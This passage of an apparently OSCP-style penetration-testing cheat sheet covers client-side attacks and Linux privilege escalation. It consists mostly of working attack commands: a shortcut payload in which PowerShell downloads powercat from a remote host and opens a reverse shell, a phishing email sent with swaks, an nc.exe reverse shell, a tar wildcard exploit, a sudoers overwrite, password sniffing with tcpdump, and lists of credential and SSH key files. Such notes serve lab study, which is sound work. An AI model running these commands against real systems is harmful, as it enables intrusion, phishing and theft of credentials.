<div class="language-shell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--auth<span class="o">=</span>anonymous<span class="w"> </span>--root<span class="w"> </span>/home/kali/webdav/
</span></code></pre></div>
Shortcut file content
<div class="language-shell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>powershell.exe<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.119.5:8000/powercat.ps1&#39;); powercat -c 192.168.45.175 -p 4444 -e powershell&quot;</span>
</span></code></pre></div></p>
<p>Upload malicious pdf, docx, odt, Library-ms file to SMB or send to email.
<div class="language-shell highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>sudo<span class="w"> </span>swaks<span class="w"> </span>-t<span class="w"> </span>dave.wizard@supermagicorg.com<span class="w"> </span>--from<span class="w"> </span>test@supermagicorg.com<span class="w"> </span>-ap<span class="w"> </span>--attach<span class="w"> </span>@config.Library-ms<span class="w"> </span>--server<span class="w"> </span><span class="m">192</span>.168.227.199<span class="w"> </span>--body<span class="w"> </span>@body.txt<span class="w"> </span>--header<span class="w"> </span><span class="s2">&quot;Subject: Problems&quot;</span><span class="w"> </span>--suppress-data
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="c1"># or use</span>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>evolution
</span></code></pre></div></p>
<p>For More, Check Out: [[Code &amp; Exploit Cheatsheet]]</p>
<h2 id="victim-linux-commands">🐧 <font color="#fac08f">Victim Linux Commands</font></h2>
<h3 id="for-more">For more</h3>
<ul>
<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">linux privesc basic</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">PayloadAllthethings LinuxPrives</a></li>
</ul>
<h3 id="stabilizing-shell">Stabilizing shell</h3>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">fg</span>
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>
</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>bash
</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>stty<span class="w"> </span>rows<span class="w"> </span>&lt;num&gt;<span class="w"> </span>columns<span class="w"> </span>&lt;num&gt;
</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>stty<span class="w"> </span>size
</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>
</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="c1"># whenever you run any exploit and getting no output then try getting back the connection on another listener</span>
</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>c:<span class="se">\x</span>ampp<span class="se">\n</span>c.exe<span class="w"> </span><span class="m">192</span>.168.45.244<span class="w"> </span><span class="m">9999</span><span class="w"> </span>-e<span class="w"> </span>powershell.exe
</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a>
</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a><span class="c1"># in case command not found occur in windows then</span>
</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a>
</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a><span class="nb">set</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>%PATH%C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="p">;</span>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span><span class="m">1</span>.0<span class="p">;</span>
</span></code></pre></div>
<h3 id="enumeration">🔍Enumeration</h3>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>sudo<span class="w"> </span>updatedb
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>locate<span class="w"> </span>&lt;file&gt;<span class="w"> </span><span class="c1"># to locate any file</span>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>id
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>cat<span class="w"> </span>/etc/passwd
</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>hostname<span class="w">  </span><span class="c1"># gives hint of the purpose of the machine</span>
</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>env<span class="w"> </span>
</span></code></pre></div>
<h4 id="user-operating-system">User &amp; Operating System</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>cat<span class="w"> </span>/etc/issue
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>cat<span class="w"> </span>/etc/*-release
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>cat<span class="w"> </span>/proc/version
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>arch
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>uname<span class="w"> </span>-r<span class="w"> </span>
</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>uname<span class="w"> </span>-a
</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>id
</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="c1"># example:  Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the x86_64 architecture</span>
</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>searchsploit<span class="w"> </span><span class="s2">&quot;linux kernel Ubuntu 16 Local Privilege Escalation&quot;</span><span class="w">   </span><span class="p">|</span><span class="w"> </span>grep<span class="w">  </span><span class="s2">&quot;4.&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot; &lt; 4.4.0&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;4.8&quot;</span>
</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>linux-exploit-suggestor-2019.sh<span class="w"> </span><span class="c1"># works great whereas latest one missed some of them</span>
</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>
</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>hostnamectl
</span></code></pre></div>
<h4 id="network">Network</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>ifconfig<span class="w"> </span>/<span class="w"> </span>ip<span class="w"> </span>a
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>routel<span class="w"> </span>/<span class="w"> </span>route
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>netstat<span class="w"> </span>-ano<span class="w">  </span>/<span class="w">  </span>ss<span class="w"> </span>-anp
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>/proc/net/tcp<span class="w">  </span><span class="c1"># use github [proc_net_parser](https://github.com/nikn0laty/proc_net_parser) Tool</span>
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>resolvectl<span class="w"> </span>status<span class="w"> </span><span class="c1"># to check for dns settings</span>
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>nslookup<span class="w"> </span>-type<span class="o">=</span>txt<span class="w"> </span>domain<span class="w"> </span>&lt;dnsserverip&gt;
</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>
</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>
</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="c1"># Firewall rules </span>
</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>iptables<span class="w"> </span><span class="c1"># requires root perms instead we can read files</span>
</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>/etc/iptables<span class="w"> </span><span class="c1"># use by sytem to restore netfilter rules at boot time</span>
</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a>cat<span class="w"> </span>/etc/iptables/rules.v4
</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a>
</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>
</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a><span class="c1"># network traffic but requires sudo for raw socket packet capture</span>
</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>lo<span class="w"> </span>-A<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;pass&quot;</span>
</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>&lt;interface&gt;<span class="w"> </span>-s<span class="w"> </span><span class="m">0</span><span class="w"> </span>-w<span class="w"> </span>capture.pcap
</span></code></pre></div>
<h4 id="cronjobs">Cronjobs</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>/etc/cron.*
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>crontab<span class="w"> </span>-l<span class="w">   </span><span class="c1"># current user cron jobs</span>
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>crontab<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-l
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>sudo<span class="w"> </span>crontab<span class="w"> </span>-l<span class="w"> </span><span class="c1"># gives root user cron jobs</span>
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>/var/log/cron.log<span class="w">  </span><span class="c1"># logs of running cronjobs</span>
</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>grep<span class="w"> </span><span class="s2">&quot;CRON&quot;</span><span class="w"> </span>/var/log/syslog
</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>/var/spool/cron/crontabs/<span class="w">   </span><span class="c1"># all crontabs in one place but sudo requires</span>
</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>
</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>ls<span class="w"> </span>/etc/cron*
</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>./pspy64
</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>
</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a><span class="c1"># tar wildcard exploit</span>
</span><span id="__span-33-13"><a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;--checkpoint-action=exec=sh exploit.sh&quot;</span><span class="w"> </span>
</span><span id="__span-33-14"><a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s1">&#39;--checkpoint=1&#39;</span>
</span><span id="__span-33-15"><a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a>
</span><span id="__span-33-16"><a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a><span class="c1"># exploit can be revshell or</span>
</span><span id="__span-33-17"><a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;kali ALL=(root) NOPASSWD: ALL&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/sudoers
</span></code></pre></div>
<h4 id="misconfigured-permissions">Misconfigured Permissions</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1"># FILES</span>
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="c1"># SUID files</span>
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-u<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w">   </span><span class="c1">#  GTFObins</span>
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="c1"># SUID or SGID</span>
</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-a<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-perm<span class="w"> </span>-u+s<span class="w"> </span>-o<span class="w"> </span>-perm<span class="w"> </span>-g+s<span class="w"> </span><span class="se">\)</span><span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="w"> </span>/dev/null
</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>
</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="c1"># linux capabilities</span>
</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>/usr/sbin/getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w">  </span><span class="c1"># cap_setuid+ep</span>
</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a>
</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="c1"># [app armor](https://apparmor.net/) status </span>
</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>sudo<span class="w"> </span>aa-status<span class="w"> </span><span class="c1"># sudo perms requires</span>
</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>/etc/apparmor.d<span class="w">  </span><span class="c1"># all the profiles gets listed here</span>
</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a><span class="c1"># to remove any binary profile from apparmor</span>
</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a>sudo<span class="w"> </span>apparmor_parser<span class="w"> </span>-R<span class="w"> </span>/etc/apparmor.d/usr.sbin.tcpdump<span class="w">  </span><span class="c1"># for example, and then remove that file and reload using systemctl apparmor</span>
</span><span id="__span-34-17"><a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a>
</span><span id="__span-34-18"><a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a>
</span><span id="__span-34-19"><a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a><span class="c1"># sudo perms</span>
</span><span id="__span-34-20"><a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a>sudo<span class="w"> </span>-l
</span><span id="__span-34-21"><a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a>sudo<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>cmd
</span><span id="__span-34-22"><a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a>sudo<span class="w"> </span>-i<span class="w">  </span><span class="c1"># to login as root</span>
</span></code></pre></div>
<h4 id="drives-devices-and-packages">Drives, devices and packages</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># drives</span>
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>mount
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>cat<span class="w"> </span>/etc/fstab
</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>lsblk
</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>df<span class="w"> </span>-h
</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>
</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="c1"># device drivers or kernel modules</span>
</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>lsmod
</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>/sbin/modinfo<span class="w"> </span>&lt;modulename_from_above_command&gt;
</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a>
</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a><span class="c1">#pkg mgmt</span>
</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>dpkg<span class="w"> </span>-l
</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a>rpm
</span></code></pre></div>
<h4 id="processes-services">Processes &amp; services</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># processes</span>
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>ps<span class="w"> </span>aux
</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>./pspy64
</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>watch<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="s2">&quot;ps -aux | grep pass&quot;</span><span class="w">  </span>
</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>proc<span class="w">     </span><span class="c1"># NOT TESTED: look for hidepid=2 for hidden process then use pspy</span>
</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>
</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>
</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="c1"># running services</span>
</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>running
</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>service<span class="w"> </span>--status-all
</span></code></pre></div>
<h4 id="searching-commands">Searching Commands</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c1"># Find Commands</span>
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>find<span class="w"> </span>.<span class="w"> </span>-name<span class="w"> </span>flag1.txt
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>find<span class="w"> </span>/<span class="w"> </span>-mtime<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="c1"># modified in the last 10 days</span>
</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>find<span class="w"> </span>/<span class="w"> </span>-atime<span class="w"> </span><span class="m">10</span><span class="w">  </span><span class="c1"># accessed</span>
</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>find<span class="w"> </span>/<span class="w"> </span>-amin<span class="w"> </span>-60<span class="w"> </span><span class="c1"># accessed min</span>
</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>find<span class="w"> </span>/<span class="w"> </span>-cmin<span class="w"> </span>-60<span class="w"> </span><span class="c1"># changed mins</span>
</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>-size<span class="w"> </span>+50M<span class="w"> </span>
</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span><span class="c1"># world writable dirs</span>
</span></code></pre></div>
<h4 id="imp-files">🗄 Imp Files</h4>
<ul>
<li><a href="https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt">Linux Sensitive files</a>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>env
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>.bashrc
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>.bash_history
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>/etc/hosts<span class="w"> </span>
</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>/etc/resolv.conf
</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>/var/lib/apache2/
</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>/etc/apache2/sites-enabled/000-default.conf
</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a>/etc/ssh/sshd_config
</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a>/etc/init.d/knockd<span class="w">  </span><span class="c1"># to find out the path of conf</span>
</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a>/etc/iptables/rules.v4
</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a>/etc/freeswitch/autoload_configs/event_socket.conf.xml
</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a>/etc/exports
</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a>/etc/redis/redis.conf
</span><span id="__span-38-15"><a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a>
</span><span id="__span-38-16"><a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a>/var/lib/grafana/grafana.db
</span><span id="__span-38-17"><a id="__codelineno-38-17" name="__codelineno-38-17" href="#__codelineno-38-17"></a>
</span><span id="__span-38-18"><a id="__codelineno-38-18" name="__codelineno-38-18" href="#__codelineno-38-18"></a>/opt<span class="w"> </span>
</span><span id="__span-38-19"><a id="__codelineno-38-19" name="__codelineno-38-19" href="#__codelineno-38-19"></a>/mnt
</span><span id="__span-38-20"><a id="__codelineno-38-20" name="__codelineno-38-20" href="#__codelineno-38-20"></a>
</span><span id="__span-38-21"><a id="__codelineno-38-21" name="__codelineno-38-21" href="#__codelineno-38-21"></a><span class="c1"># Different ssh keys name</span>
</span><span id="__span-38-22"><a id="__codelineno-38-22" name="__codelineno-38-22" href="#__codelineno-38-22"></a>/home/user/.ssh/id_rsa
</span><span id="__span-38-23"><a id="__codelineno-38-23" name="__codelineno-38-23" href="#__codelineno-38-23"></a>id_ecdsa
</span><span id="__span-38-24"><a id="__codelineno-38-24" name="__codelineno-38-24" href="#__codelineno-38-24"></a>id_ed25519
</span><span id="__span-38-25"><a id="__codelineno-38-25" name="__codelineno-38-25" href="#__codelineno-38-25"></a>id_dsa
</span><span id="__span-38-26"><a id="__codelineno-38-26" name="__codelineno-38-26" href="#__codelineno-38-26"></a>id_ecdsa_sk<span class="w"> </span>
</span><span id="__span-38-27"><a id="__codelineno-38-27" name="__codelineno-38-27" href="#__codelineno-38-27"></a>id_ed25519_sk
</span><span id="__span-38-28"><a id="__codelineno-38-28" name="__codelineno-38-28" href="#__codelineno-38-28"></a>
</span><span id="__span-38-29"><a id="__codelineno-38-29" name="__codelineno-38-29" href="#__codelineno-38-29"></a>
</span><span id="__span-38-30"><a id="__codelineno-38-30" name="__codelineno-38-30" href="#__codelineno-38-30"></a>/usr/share/tomcat9/etc/tomcat-users.xml
</span><span id="__span-38-31"><a id="__codelineno-38-31" name="__codelineno-38-31" href="#__codelineno-38-31"></a>
